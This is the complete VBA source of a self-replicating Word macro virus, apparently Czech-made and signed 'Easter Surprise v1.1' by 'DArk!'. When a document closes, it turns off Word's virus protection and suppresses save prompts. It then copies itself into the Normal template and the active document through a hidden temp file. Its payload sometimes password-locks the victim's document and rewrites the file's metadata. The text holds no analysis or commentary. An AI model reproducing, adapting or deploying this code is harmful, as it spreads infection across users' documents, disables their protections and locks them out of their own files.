   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True
   Private Sub Document_Close()
       Application.EnableCancelKey = wdCancelDisabled
       With Options
           .VirusProtection = False
           .AllowFastSave = True
           .BackgroundSave = True
           .CreateBackup = False
           .SavePropertiesPrompt = False
           .SaveNormalPrompt = False
       End With

       Call Test_Pritomnosti
       Call Akce
       ActiveDocument.Save

       End Sub

   Private Sub Test_Pritomnosti()
       If NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then _
       Call Instaluj_Do_Sablony
       If ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(1, 1) <> "Private Sub Document_Close()" Then _
       Call Instaluj_do_Dokumentu
   End Sub

   Private Sub Instaluj_Do_Sablony()
   Call Tmp_File
   Open "c:\windows\temp\wrdtmpa.tmp" For Input As #1
   If LOF(1) = 0 Then GoTo konec
   i = 1
   Do While Not EOF(1)
   Line Input #1, a
   NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, a
   i = i + 1
   Loop
   konec:
   Close #1
   Kill "c:\windows\temp\wrdtmpa.tmp"
   End Sub

   Private Sub Instaluj_do_Dokumentu()
   Call Tmp_File
   Open "c:\windows\temp\wrdtmpa.tmp" For Input As #1
   If LOF(1) = 0 Then GoTo konec
   i = 1
   Do While Not EOF(1)
   Line Input #1, a
   ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.InsertLines i, a
   i = i + 1
   Loop
   konec:
   Close #1
   Kill "c:\windows\temp\wrdtmpa.tmp"
   End Sub

   Private Sub Tmp_File()
   Open "c:\windows\temp\wrdtmpa.tmp" For Output As #1
   For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
   a = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
   Print #1, a
   Next i
   Close #1
   SetAttr "c:\windows\temp\wrdtmpa.tmp", 6
   End Sub

   Private Sub Akce()
   Dim Mesic, rok
   Mesic = Month(Date)
   rok = Year(Date)
   If (Mesic = 3) Then GoTo konec   'Brezen mesic internetu - March is month of internet!
      If Rnd > 0.4 Then GoTo konec

       With ActiveDocument
           .Password = "DArk![FA]"
           .WritePassword = ""
       End With

       With Dialogs(wdDialogFileSummaryInfo): _
           .Title = "Easter  Surprise v1.1": _
           .Author = "DArk!, ISÅ E": _
           .Keywords = "CZECH MADE!": _
           .Execute
       End With
       Application.DefaultSaveFormat = ""
       ActiveDocument.Save

   konec:

   End Sub
